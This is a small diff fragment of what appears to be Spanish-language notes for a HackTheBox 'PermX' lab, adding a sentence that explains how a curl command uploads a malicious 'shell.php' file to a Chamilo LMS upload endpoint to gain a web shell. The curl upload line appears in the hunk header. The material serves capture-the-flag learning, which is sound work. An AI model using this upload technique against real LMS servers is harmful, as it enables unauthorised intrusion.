@@ -61,6 +61,6 @@ curl -F 'bigUploadFile=@shell.php' 'http://lms.permx.htb/main/inc/lib/javascript
 
 ```
 
-de esta forma vamos a 
+de esta forma vamos a cargar un archivo malicioso en este caso llamado shell.php usando el parámetro `-F` 
 ![[Pasted image 20240712140505.png]]
 
